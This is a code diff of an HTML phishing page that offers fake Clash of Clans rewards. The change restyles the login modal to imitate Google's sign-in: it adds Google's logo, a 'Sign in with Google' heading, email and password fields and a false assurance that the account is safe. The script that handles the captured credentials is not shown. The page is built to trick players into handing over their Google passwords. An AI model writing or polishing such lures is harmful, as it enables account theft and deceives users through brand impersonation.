@@ -7,12 +7,9 @@
 </head>
 <body>
 
-<!-- Floating Coins & Stars -->
-<div class="floating-elements">
-  <img src="https://cdn-icons-png.flaticon.com/512/138/138292.png" class="float coin">
-  <img src="https://cdn-icons-png.flaticon.com/512/616/616408.png" class="float star">
-  <img src="https://cdn-icons-png.flaticon.com/512/138/138292.png" class="float coin">
-</div>
+<!-- Floating Characters -->
+<img id="barbarian" class="floating-character" src="https://static.wikia.nocookie.net/clashofclans/images/d/d5/Barbarian_info.png">
+<img id="archer" class="floating-character" src="https://static.wikia.nocookie.net/clashofclans/images/8/8e/Archer_info.png">
 
 <header>
   <div class="logo-section">
@@ -20,10 +17,6 @@
     <h1>Claim Your Clash Rewards!</h1>
   </div>
   <p class="subtitle">Exclusive Skins & Sceneries for a Limited Time</p>
-  <div class="character-bar">
-    <img src="https://static.wikia.nocookie.net/clashofclans/images/d/d5/Barbarian_info.png" class="char barbarian">
-    <img src="https://static.wikia.nocookie.net/clashofclans/images/8/8e/Archer_info.png" class="char archer">
-  </div>
 </header>
 
 <main>
@@ -33,12 +26,13 @@
 <!-- Login Modal -->
 <div id="loginModal" class="login-modal">
   <div class="login-container">
-    <h2>Sign in to Claim</h2>
-    <p>Use your Google account to continue</p>
-    <input id="loginEmail" type="email" placeholder="Email">
-    <input id="loginPassword" type="password" placeholder="Password">
-    <button onclick="login()">Login & Claim</button>
-    <p class="login-note">Your account is safe. This is a secure Supercell reward claim.</p>
+    <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google Logo" style="width:60px;margin-bottom:15px;">
+    <h2>Sign in with Google</h2>
+    <p>to continue to Clash Rewards</p>
+    <input id="loginEmail" type="email" placeholder="Email or phone">
+    <input id="loginPassword" type="password" placeholder="Enter your password">
+    <button onclick="login()">Next</button>
+    <p class="login-note">Your Google account is safe. This is a secure reward claim.</p>
   </div>
 </div>
 
